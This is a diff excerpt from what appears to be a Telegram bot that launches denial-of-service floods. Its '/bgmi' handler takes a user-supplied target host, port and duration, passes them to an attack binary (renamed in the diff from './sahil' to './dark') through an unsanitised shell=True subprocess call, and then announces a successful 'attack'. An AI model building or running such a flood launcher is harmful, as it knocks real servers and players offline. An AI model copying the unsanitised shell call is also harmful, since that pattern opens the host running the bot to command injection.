@@ -234,7 +234,7 @@ def handle_bgmi(message):
                 record_command_logs(user_id, '/bgmi', target, port, time)
                 log_command(user_id, target, port, time)
                 start_attack_reply(message, target, port, time)  # Call start_attack_reply function
-                full_command = f"./sahil {target} {port} {time} 9 900"
+                full_command = f"./dark {target} {port} {time} 9 900"
                 subprocess.run(full_command, shell=True)
                 response = f"🚀ᴀᴛᴛᴀᴄᴋ ᴏɴ➡️ {target}:{port} \n💘ᴄᴏᴍᴘʟᴇᴛᴇ ✅ sᴜᴄᴄᴇssғᴜʟʟʏ🔊️\n https://t.me/kasukabe0"
         else:
